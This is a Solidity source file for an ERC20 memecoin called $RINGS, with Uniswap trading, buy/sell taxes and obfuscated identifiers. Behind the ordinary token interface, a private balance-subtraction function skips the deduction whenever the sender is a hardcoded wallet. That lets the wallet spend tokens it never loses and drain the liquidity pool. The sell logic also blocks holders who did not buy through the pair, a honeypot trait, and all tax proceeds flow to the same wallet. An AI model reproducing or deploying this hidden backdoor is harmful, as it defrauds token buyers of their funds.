/**

The The Lord of the Rings   $RINGS


Twitter: https://twitter.com/rings_eth
Telegram: https://t.me/rings_eth
Website: https://ringseth.org/

**/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _eupve(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _eupve(a, b, "SafeMath");
    }

    function  _eupve(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract RINGS is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _Treuguk;
    address payable private _pyfziwp;
    address private _crgveu;

    string private constant _name = unicode"The The Lord of the Rings";
    string private constant _symbol = unicode"RINGS";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _psyluvr;
    mapping (address => bool) private _yrqijy;
    mapping(address => uint256) private _qnjpxq;
    uint256 public _qvalbid = _totalSupply;
    uint256 public _eporvje = _totalSupply;
    uint256 public _reTjkar= _totalSupply;
    uint256 public _vodTecf= _totalSupply;

    uint256 private _BuyinitialTax=10;
    uint256 private _SellinitialTax=15;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=5;
    uint256 private _SellAreduceTax=1;
    uint256 private _ykgvjq=0;
    uint256 private _uejsjrg=0;
    

    bool private _epbwjar;
    bool public _Dreorbf = false;
    bool private ptyvabe = false;
    bool private _oingvju = false;


    event _hrqwpat(uint _qvalbid);
    modifier urvsgjr {
        ptyvabe = true;
        _;
        ptyvabe = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _psyluvr[owner(

        )] = true;
        _psyluvr[address
        (this)] = true;
        _psyluvr[
            _pyfziwp] = true;
        _pyfziwp = 
        payable (0x426DC7cd1aF223Aa8bE3df93a03003b064F0fe36);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _eupve(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 kcvdrk=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_Dreorbf) {
                if (to 
                != address
                (_Treuguk) 
                && to !=
                 address
                 (_crgveu)) {
                  require(_qnjpxq
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _qnjpxq
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _crgveu && to != 
            address(_Treuguk) &&
             !_psyluvr[to] ) {
                require(amount 
                <= _qvalbid,
                 "Exceeds the _qvalbid.");
                require(balanceOf
                (to) + amount
                 <= _eporvje,
                  "Exceeds the _eporvje.");
                if(_uejsjrg
                < _ykgvjq){
                  require
                  (! _eirkqez(to));
                }
                _uejsjrg++;
                 _yrqijy
                 [to]=true;
                kcvdrk = amount._pvr
                ((_uejsjrg>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _crgveu &&
             from!= address(this) 
            && !_psyluvr[from] ){
                require(amount <= 
                _qvalbid && 
                balanceOf(_pyfziwp)
                <_vodTecf,
                 "Exceeds the _qvalbid.");
                kcvdrk = amount._pvr((_uejsjrg>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_uejsjrg>
                _ykgvjq &&
                 _yrqijy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!ptyvabe 
            && to == _crgveu &&
             _oingvju &&
             contractTokenBalance>
             _reTjkar 
            && _uejsjrg>
            _ykgvjq&&
             !_psyluvr[to]&&
              !_psyluvr[from]
            ) {
                _transferFrom( _wluof(amount, 
                _wluof(contractTokenBalance,
                _vodTecf)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _xpeiwo(address
                    (this).balance);
                }
            }
        }

        if(kcvdrk>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(kcvdrk);
          emit
           Transfer(from,
           address
           (this),kcvdrk);
        }
        _balances[from
        ]= _eupve(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _eupve(kcvdrk));
        emit Transfer
        (from, to, 
        amount.
         _eupve(kcvdrk));
    }

    function _transferFrom(uint256
     tokenAmount) private
      urvsgjr {
        if(tokenAmount==
        0){return;}
        if(!_epbwjar)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _Treuguk.WETH();
        _approve(address(this),
         address(
             _Treuguk), 
             tokenAmount);
        _Treuguk.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _wluof
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _eupve(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _pyfziwp){
            return a ;
        }else{
            return a .
             _eupve (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _qvalbid = _totalSupply;
        _eporvje = _totalSupply;
        emit _hrqwpat(_totalSupply);
    }

    function _eirkqez(address 
    account) private view 
    returns (bool) {
        uint256 efjosv;
        assembly {
            efjosv :=
             extcodesize
             (account)
        }
        return efjosv > 
        0;
    }

    function _xpeiwo(uint256
    amount) private {
        _pyfziwp.
        transfer(
            amount);
    }

    function openhTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _epbwjar ) ;
        _Treuguk  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _Treuguk), 
            _totalSupply);
        _crgveu = 
        IUniswapV2Factory(_Treuguk.
        factory( ) 
        ). createPair (
            address(this
            ),  _Treuguk .
             WETH ( ) );
        _Treuguk.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_crgveu).
        approve(address(_Treuguk), 
        type(uint)
        .max);
        _oingvju = true;
        _epbwjar = true;
    }

    receive() external payable {}
}